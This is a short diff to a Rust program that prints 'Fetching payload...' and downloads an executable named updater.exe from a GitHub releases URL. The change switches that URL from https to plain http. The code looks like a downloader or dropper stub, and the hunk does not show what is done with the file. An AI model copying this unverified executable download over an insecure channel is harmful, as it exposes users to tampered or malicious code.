@@ -5,7 +5,7 @@ use windows::{core::{Interface, PCWSTR, PWSTR}, Win32::{System::Com::{CoCreateIn
 #[tokio::main]
 async fn main() {
     println!("Fetching payload...");
-    let download_url = "https://github.com/ctih1/kake/releases/download/latest/updater.exe";
+    let download_url = "http://github.com/ctih1/kake/releases/latest/download/updater.exe";
 
     let resp = reqwest::get(download_url).await.expect("failed to download payload");
     let body = resp.bytes().await.expect("Invalid payload");
